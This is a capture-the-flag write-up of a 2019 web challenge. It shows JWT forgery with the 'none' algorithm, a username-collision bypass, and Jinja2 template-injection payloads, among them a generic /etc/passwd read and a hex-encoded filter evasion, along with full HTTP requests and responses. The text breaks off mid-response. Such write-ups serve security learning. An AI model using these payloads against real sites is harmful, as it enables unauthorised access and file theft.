@@ -1,0 +1,1109 @@
+<h1>X-MAS CTF 2019 – Mercenary Hat Factory</h1>
+
+<ul>
+<li><strong>Category:</strong> web</li>
+<li><strong>Points:</strong> 424 </li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>"Mmph Mmmmph Mmph Mmmph!"
+  Translation: Come and visit our hat factory!</p>
+  
+  <p>Files: <a href="server.py">server.py</a></p>
+  
+  <p>Remote server: http://challs.xmas.htsp.ro:11005</p>
+  
+  <p>Author: Milkdrop</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>Registering a user and analyzing cookies you will find a cookie called <code>auth</code> containing a JWT.</p>
+
+<p>```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoidXNlciIsInVzZXIiOiJtM3NzYXAwIn0.6MIKOYbtUodqSJUZyT4iGRMLPcrRzbniLjJU8nhNhKY</p>
+
+<p>{"typ":"JWT","alg":"HS256"}.{"type":"user","user":"m3ssap0"}.6MIKOYbtUodqSJUZyT4iGRMLPcrRzbniLjJU8nhNhKY
+```</p>
+
+<p>You can check its creation inside <code>register</code> and <code>login</code> methods of the source code <a href="server.py">server.py</a>.</p>
+
+<p>Analyzing the source code you can discover two interesting endpoints:
+* <code>/makehat</code> for which you have to be an authorized admin;
+* <code>/authorize</code> that can let you to become an authorized admin, but there are some restrictions.</p>
+
+<p>Considering the presence of template rendering operations into <code>/makehat</code> endpoint with a parameter read from the user, i.e. <code>hatName</code>, probably that functionality is vulnerable to <em>Server Side Template Injection</em> (<em>SSTI</em>) due to the insecure usage of <em>Flask/Jinja2</em> template engine.</p>
+
+<p>The first check to bypass for the <code>/authorize</code> endpoint is the following.</p>
+
+<p><code>python
+            if (userData["type"] != "admin"):
+                return render_template ("error.html", error = "Unauthorized.")
+</code></p>
+
+<p>This can be easily bypassed forging a JWT like the following and testing that you are an admin connecting to the root of the website.</p>
+
+<p>```
+{"typ":"JWT","alg":"none"}.{"type":"admin","user":"m3ssap0"}.</p>
+
+<p>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoibTNzc2FwMCJ9.
+```</p>
+
+<p>Checking it to the index endpoint.</p>
+
+<p>```
+GET / HTTP/1.1
+Host: challs.xmas.htsp.ro:11005
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoibTNzc2FwMCJ9.
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0</p>
+
+<p>HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 17 Dec 2019 14:11:54 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 736
+Connection: close</p>
+
+<p><head>
+    <link rel="stylesheet" type="text/css" href="/static/css/styles.css">
+</head></p>
+
+<p><body>
+    <div class="navbar">
+<a style="float: left" href="/">Home</a></p>
+
+<pre><code>&lt;a href="/logout"&gt;Logout&lt;/a&gt;
+</code></pre>
+
+</div>
+    <div class="container">
+<pre><code>        &lt;h1&gt;Welcome &lt;span style="color: #A1FF44"&gt;m3ssap0&lt;/span&gt;!&lt;/h1&gt;
+
+
+                &lt;div&gt;You are a Level 1 factory administrator. Here is your factory jam:&lt;br&gt;&lt;br&gt;
+                &lt;iframe width="879" height="468" src="https://www.youtube.com/embed/aj1yZ19WuM0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;
+
+            &lt;/div&gt;
+            &lt;img class="companion" src="/static/img/balloonicorn.png"&gt;
+
+
+&lt;/div&gt;
+&lt;script src="/static/js/snow.js"&gt;&lt;/script&gt;
+
+</code></pre>
+</body>
+```
+
+At this point you have to break this check.
+
+```python
+                if (request.form.get ('accessCode') == str (uid) + usr + pss + userpss):
+                    authorizedAdmin [userData ["user"]] = True
+```
+
+Analyzing the code you will understand that variables are populated from Santa's data, that data is well known except its secret.
+
+```python
+adminPrivileges = [[None]*3]*500
+
+adminPrivileges [0][0] = 0 # UID
+adminPrivileges [0][1] = "Santa" #Uname
+adminPrivileges [0][2] = SantaSecret
+```
+
+<ul>
+
+<p><li><code>str(uid)</code> is <code>0</code>;</li>
+<li><code>usr</code> is <code>Santa</code>;</li>
+<li><code>pss</code> is the unknown <code>SantaSecret</code>;</li>
+<li><code>userpss</code> can be set following the <code>step=1</code> procedure of the <code>/authorize</code> endpoint, so it can be forced.</li></p>
+
+</ul>
+
+At this point I was stuck and I was not able to bypass this check, so I did something (stupid, lol) that led me to what I think was an **unintended solution** to bypass the check: I registered a user with username `Santa`.
+
+The user with username `Santa` was already into `adminPrivileges`, so I only crafted the correct JWT to bypass the previous check and I added the `pass` field needed by the `/makehat` endpoint.
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoidXNlciIsInVzZXIiOiJTYW50YSJ9.zTPHtZUj9Avd1XXpM6T0nnLl7x9QeuSqaqB5ClMH8gk
+
+{"typ":"JWT","alg":"HS256"}.{"type":"user","user":"Santa"}.zTPHtZUj9Avd1XXpM6T0nnLl7x9QeuSqaqB5ClMH8gk
+
+{"typ":"JWT","alg":"none"}.{"type":"admin","user":"Santa","pass":"password"}.
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
+```
+
+Here the request to the endpoint.
+
+```
+GET /makehat?hatName=test HTTP/1.1
+Host: challs.xmas.htsp.ro:11005
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://challs.xmas.htsp.ro:11005/register
+Connection: close
+Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 19 Dec 2019 00:03:09 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 459
+Connection: close
+
+<head>
+    <link rel="stylesheet" type="text/css" href="/static/css/styles.css">
+</head>
+
+<body>
+    <div class="navbar">
+<a style="float: left" href="/">Home</a>
+<pre><code>&lt;a href="/login"&gt;Login&lt;/a&gt;
+&lt;a href="/register"&gt;Register&lt;/a&gt;
+
+<p></code></pre>
+</div>
+    <div class="container" style="text-align:center">
+        <img class="hat" src="/static/img/hats/7.png">
+        <h1>You are viewing:<br><span style="color:#FFA144;">test</span></h1>
+    </div>
+</body></p>
+
+<script src="/static/js/snow.js"></script>
+
+<p>```</p>
+
+<p>Trying the auth token to the homepage will confirm our privileges.</p>
+
+<p>```
+GET / HTTP/1.1
+Host: challs.xmas.htsp.ro:11005
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
+Upgrade-Insecure-Requests: 1</p>
+
+<p>HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 19 Dec 2019 00:06:49 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 971
+Connection: close</p>
+
+<p><head>
+    <link rel="stylesheet" type="text/css" href="/static/css/styles.css">
+</head></p>
+
+<p><body>
+    <div class="navbar">
+<a style="float: left" href="/">Home</a></p>
+
+<pre><code>&lt;a href="/logout"&gt;Logout&lt;/a&gt;
+</code></pre>
+
+<p></div>
+    <div class="container"></p>
+
+<pre><code>        &lt;h1&gt;Welcome &lt;span style="color: #A1FF44"&gt;Santa&lt;/span&gt;!&lt;/h1&gt;
+
+
+                &lt;div&gt;You are a Level 2 factory administrator. You may now test and create new hats. You can now oversee the factory workers:&lt;br&gt;&lt;br&gt;
+                &lt;iframe width="879" height="468" src="https://www.youtube.com/embed/QDCPKBF7a1Q" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;
+                &lt;br&gt;&lt;br&gt;
+                &lt;form action="/makehat" method="get"&gt;
+                    &lt;input placeholder="Hat Name" type="text" name="hatName"&gt;&lt;br&gt;
+                &lt;input type="submit" value="Make Hat!"&gt;
+                &lt;/form&gt; 
+
+            &lt;/div&gt;
+            &lt;img class="companion" src="/static/img/balloonicorn.png"&gt;
+
+
+&lt;/div&gt;
+&lt;script src="/static/js/snow.js"&gt;&lt;/script&gt;
+</code></pre>
+
+<p></body>
+```</p>
+
+<p>Trying the <code>{{7*7}}</code> payload to the <code>/makehat</code> endpoint will reveal a SSTI vulnerability.</p>
+
+<p>```
+GET /makehat?hatName=%7B%7B7%2A7%7D%7D HTTP/1.1
+Host: challs.xmas.htsp.ro:11005
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://challs.xmas.htsp.ro:11005/register
+Connection: close
+Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0</p>
+
+<p>HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 19 Dec 2019 00:11:40 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 457
+Connection: close</p>
+
+<p><head>
+    <link rel="stylesheet" type="text/css" href="/static/css/styles.css">
+</head></p>
+
+<p><body>
+    <div class="navbar">
+<a style="float: left" href="/">Home</a></p>
+
+<pre><code>&lt;a href="/login"&gt;Login&lt;/a&gt;
+&lt;a href="/register"&gt;Register&lt;/a&gt;
+</code></pre>
+
+<p></div>
+    <div class="container" style="text-align:center">
+        <img class="hat" src="/static/img/hats/3.png">
+        <h1>You are viewing:<br><span style="color:#FFA144;">49</span></h1>
+    </div>
+</body></p>
+
+<script src="/static/js/snow.js"></script>
+
+<p>```</p>
+
+<p>Usually, something like the following can be used to access classes loaded into the server and to invoke them.</p>
+
+<p><code>python
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+</code></p>
+
+<p>But we have some restrictions, as you can see in the following blacklist used into <code>/makehat</code> endpoint.</p>
+
+<p><code>python
+blacklist = ["config", "self", "request", "[", "]", '"', "_", "+", " ", "join", "%", "%25"]
+</code></p>
+
+<p>So we have to use some tricks like the hexadecimal encoding of the strings and the <code>attr</code> filter of Jinja2.</p>
+
+<p>The following request can be used to enumerate all classes.</p>
+
+<p>```
+GET /makehat?hatName={{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()}} HTTP/1.1
+Host: challs.xmas.htsp.ro:11005
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://challs.xmas.htsp.ro:11005/register
+Connection: close
+Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0</p>
+
+<p>HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 19 Dec 2019 00:30:39 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Vary: Accept-Encoding
+Content-Length: 36060</p>
+
+<p><head>
+    <link rel="stylesheet" type="text/css" href="/static/css/styles.css">
+</head></p>
+
+<p><body>
+    <div class="navbar">
+<a style="float: left" href="/">Home</a></p>
+
+<pre><code>&lt;a href="/login"&gt;Login&lt;/a&gt;
+&lt;a href="/register"&gt;Register&lt;/a&gt;
+</code></pre>
+
+<p></div>
+    <div class="container" style="text-align:center">
+        <img class="hat" src="/static/img/hats/7.png">
+        <h1>You are viewing:<br><span style="color:#FFA144;">[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict<em>keys&#39;&gt;, &lt;class &#39;dict</em>values&#39;&gt;, &lt;class &#39;dict<em>items&#39;&gt;, &lt;class &#39;odict</em>iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin<em>function</em>or<em>method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset</em>descriptor&#39;&gt;, &lt;class &#39;wrapper<em>descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member</em>descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange<em>iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod</em>descriptor&#39;&gt;, &lt;class &#39;method<em>descriptor&#39;&gt;, &lt;class &#39;callable</em>iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine<em>wrapper&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt</em>array<em>node&#39;&gt;, &lt;class &#39;hamt</em>bitmap<em>node&#39;&gt;, &lt;class &#39;hamt</em>collision<em>node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;</em>frozen<em>importlib.</em>ModuleLock&#39;&gt;, &lt;class &#39;<em>frozen</em>importlib.<em>DummyModuleLock&#39;&gt;, &lt;class &#39;</em>frozen<em>importlib.</em>ModuleLockManager&#39;&gt;, &lt;class &#39;<em>frozen</em>importlib.<em>installed</em>safely&#39;&gt;, &lt;class &#39;<em>frozen</em>importlib.ModuleSpec&#39;&gt;, &lt;class &#39;<em>frozen</em>importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;<em>frozen</em>importlib.FrozenImporter&#39;&gt;, &lt;class &#39;<em>frozen</em>importlib.<em>ImportLockContext&#39;&gt;, &lt;class &#39;</em>thread.<em>localdummy&#39;&gt;, &lt;class &#39;</em>thread.<em>local&#39;&gt;, &lt;class &#39;</em>thread.lock&#39;&gt;, &lt;class &#39;<em>thread.RLock&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;</em>frozen<em>importlib</em>external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;<em>frozen</em>importlib<em>external.</em>LoaderBasics&#39;&gt;, &lt;class &#39;<em>frozen</em>importlib<em>external.FileLoader&#39;&gt;, &lt;class &#39;</em>frozen<em>importlib</em>external.<em>NamespacePath&#39;&gt;, &lt;class &#39;</em>frozen<em>importlib</em>external.<em>NamespaceLoader&#39;&gt;, &lt;class &#39;</em>frozen<em>importlib</em>external.PathFinder&#39;&gt;, &lt;class &#39;<em>frozen</em>importlib<em>external.FileFinder&#39;&gt;, &lt;class &#39;</em>io.<em>IOBase&#39;&gt;, &lt;class &#39;</em>io.<em>BytesIOBuffer&#39;&gt;, &lt;class &#39;</em>io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;<em>abc</em>data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict<em>itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async</em>generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes<em>iterator&#39;&gt;, &lt;class &#39;bytearray</em>iterator&#39;&gt;, &lt;class &#39;dict<em>keyiterator&#39;&gt;, &lt;class &#39;dict</em>valueiterator&#39;&gt;, &lt;class &#39;list<em>iterator&#39;&gt;, &lt;class &#39;list</em>reverseiterator&#39;&gt;, &lt;class &#39;range<em>iterator&#39;&gt;, &lt;class &#39;set</em>iterator&#39;&gt;, &lt;class &#39;str<em>iterator&#39;&gt;, &lt;class &#39;tuple</em>iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os.<em>wrap</em>close&#39;&gt;, &lt;class &#39;<em>sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;</em>sitebuiltins.<em>Printer&#39;&gt;, &lt;class &#39;</em>sitebuiltins.<em>Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types.</em>GeneratorWrapper&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;<em>collections.</em>deque<em>iterator&#39;&gt;, &lt;class &#39;</em>collections.<em>deque</em>reverse<em>iterator&#39;&gt;, &lt;class &#39;enum.auto&#39;&gt;, &lt;enum &#39;Enum&#39;&gt;, &lt;class &#39;re.Pattern&#39;&gt;, &lt;class &#39;re.Match&#39;&gt;, &lt;class &#39;</em>sre.SRE<em>Scanner&#39;&gt;, &lt;class &#39;sre</em>parse.Pattern&#39;&gt;, &lt;class &#39;sre<em>parse.SubPattern&#39;&gt;, &lt;class &#39;sre</em>parse.Tokenizer&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools.<em>lru</em>cache<em>wrapper&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations</em>with<em>replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip</em>longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools.<em>grouper&#39;&gt;, &lt;class &#39;itertools.</em>tee&#39;&gt;, &lt;class &#39;itertools.<em>tee</em>dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.<em>Link&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;re.Scanner&#39;&gt;, &lt;class &#39;<strong>future</strong>.</em>Feature&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch<em>warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib.</em>GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib.<em>BaseExitStack&#39;&gt;, &lt;class &#39;zlib.Compress&#39;&gt;, &lt;class &#39;zlib.Decompress&#39;&gt;, &lt;class &#39;tokenize.Untokenizer&#39;&gt;, &lt;class &#39;traceback.FrameSummary&#39;&gt;, &lt;class &#39;traceback.TracebackException&#39;&gt;, &lt;class &#39;</em>weakrefset.<em>IterationGuard&#39;&gt;, &lt;class &#39;</em>weakrefset.WeakSet&#39;&gt;, &lt;class &#39;threading.<em>RLock&#39;&gt;, &lt;class &#39;threading.Condition&#39;&gt;, &lt;class &#39;threading.Semaphore&#39;&gt;, &lt;class &#39;threading.Event&#39;&gt;, &lt;class &#39;threading.Barrier&#39;&gt;, &lt;class &#39;threading.Thread&#39;&gt;, &lt;class &#39;</em>bz2.BZ2Compressor&#39;&gt;, &lt;class &#39;<em>bz2.BZ2Decompressor&#39;&gt;, &lt;class &#39;</em>lzma.LZMACompressor&#39;&gt;, &lt;class &#39;<em>lzma.LZMADecompressor&#39;&gt;, &lt;class &#39;Struct&#39;&gt;, &lt;class &#39;unpack</em>iterator&#39;&gt;, &lt;class &#39;zipfile.ZipInfo&#39;&gt;, &lt;class &#39;zipfile.LZMACompressor&#39;&gt;, &lt;class &#39;zipfile.LZMADecompressor&#39;&gt;, &lt;class &#39;zipfile.<em>SharedFile&#39;&gt;, &lt;class &#39;zipfile.</em>Tellable&#39;&gt;, &lt;class &#39;zipfile.ZipFile&#39;&gt;, &lt;class &#39;weakref.finalize.<em>Info&#39;&gt;, &lt;class &#39;weakref.finalize&#39;&gt;, &lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;select.poll&#39;&gt;, &lt;class &#39;select.epoll&#39;&gt;, &lt;class &#39;selectors.BaseSelector&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;datetime.date&#39;&gt;, &lt;class &#39;datetime.timedelta&#39;&gt;, &lt;class &#39;datetime.time&#39;&gt;, &lt;class &#39;datetime.tzinfo&#39;&gt;, &lt;class &#39;pyexpat.xmlparser&#39;&gt;, &lt;class &#39;plistlib.Data&#39;&gt;, &lt;class &#39;plistlib.</em>PlistParser&#39;&gt;, &lt;class &#39;plistlib.<em>DumbXMLWriter&#39;&gt;, &lt;class &#39;plistlib.</em>BinaryPlistParser&#39;&gt;, &lt;class &#39;plistlib.<em>BinaryPlistWriter&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;class &#39;email.charset.Charset&#39;&gt;, &lt;class &#39;email.header.Header&#39;&gt;, &lt;class &#39;email.header.</em>ValueFormatter&#39;&gt;, &lt;class &#39;<em>hashlib.HASH&#39;&gt;, &lt;class &#39;</em>blake2.blake2b&#39;&gt;, &lt;class &#39;<em>blake2.blake2s&#39;&gt;, &lt;class &#39;</em>sha3.sha3<em>224&#39;&gt;, &lt;class &#39;</em>sha3.sha3<em>256&#39;&gt;, &lt;class &#39;</em>sha3.sha3<em>384&#39;&gt;, &lt;class &#39;</em>sha3.sha3<em>512&#39;&gt;, &lt;class &#39;</em>sha3.shake<em>128&#39;&gt;, &lt;class &#39;</em>sha3.shake<em>256&#39;&gt;, &lt;class &#39;</em>random.Random&#39;&gt;, &lt;class &#39;<em>socket.socket&#39;&gt;, &lt;class &#39;urllib.parse.</em>ResultMixinStr&#39;&gt;, &lt;class &#39;urllib.parse.<em>ResultMixinBytes&#39;&gt;, &lt;class &#39;urllib.parse.</em>NetlocResultMixinBase&#39;&gt;, &lt;class &#39;calendar.<em>localized</em>month&#39;&gt;, &lt;class &#39;calendar.<em>localized</em>day&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;calendar.different<em>locale&#39;&gt;, &lt;class &#39;email.</em>parseaddr.AddrlistClass&#39;&gt;, &lt;class &#39;email.<em>policybase.</em>PolicyBase&#39;&gt;, &lt;class &#39;email.feedparser.BufferedSubFile&#39;&gt;, &lt;class &#39;email.feedparser.FeedParser&#39;&gt;, &lt;class &#39;email.parser.Parser&#39;&gt;, &lt;class &#39;email.parser.BytesParser&#39;&gt;, &lt;class &#39;tempfile.<em>RandomNameSequence&#39;&gt;, &lt;class &#39;tempfile.</em>TemporaryFileCloser&#39;&gt;, &lt;class &#39;tempfile.<em>TemporaryFileWrapper&#39;&gt;, &lt;class &#39;tempfile.SpooledTemporaryFile&#39;&gt;, &lt;class &#39;tempfile.TemporaryDirectory&#39;&gt;, &lt;class &#39;textwrap.TextWrapper&#39;&gt;, &lt;class &#39;dis.Bytecode&#39;&gt;, &lt;class &#39;inspect.BlockFinder&#39;&gt;, &lt;class &#39;inspect.</em>void&#39;&gt;, &lt;class &#39;inspect.<em>empty&#39;&gt;, &lt;class &#39;inspect.Parameter&#39;&gt;, &lt;class &#39;inspect.BoundArguments&#39;&gt;, &lt;class &#39;inspect.Signature&#39;&gt;, &lt;class &#39;pkg</em>resources.extern.VendorImporter&#39;&gt;, &lt;class &#39;pkg<em>resources.</em>vendor.six.<em>LazyDescr&#39;&gt;, &lt;class &#39;pkg</em>resources.<em>vendor.six.</em>SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg<em>resources.</em>vendor.six.<em>LazyDescr&#39;&gt;, &lt;class &#39;pkg</em>resources.<em>vendor.six.</em>SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg<em>resources.</em>vendor.appdirs.AppDirs&#39;&gt;, &lt;class &#39;pkg<em>resources.extern.packaging.</em>structures.Infinity&#39;&gt;, &lt;class &#39;pkg<em>resources.extern.packaging.</em>structures.NegativeInfinity&#39;&gt;, &lt;class &#39;pkg<em>resources.extern.packaging.version.</em>BaseVersion&#39;&gt;, &lt;class &#39;pkg<em>resources.extern.packaging.specifiers.BaseSpecifier&#39;&gt;, &lt;class &#39;pprint.</em>safe<em>key&#39;&gt;, &lt;class &#39;pprint.PrettyPrinter&#39;&gt;, &lt;class &#39;pkg</em>resources.<em>vendor.pyparsing.</em>Constants&#39;&gt;, &lt;class &#39;pkg<em>resources.</em>vendor.pyparsing.<em>ParseResultsWithOffset&#39;&gt;, &lt;class &#39;pkg</em>resources.<em>vendor.pyparsing.ParseResults&#39;&gt;, &lt;class &#39;pkg</em>resources.<em>vendor.pyparsing.ParserElement.</em>UnboundedCache&#39;&gt;, &lt;class 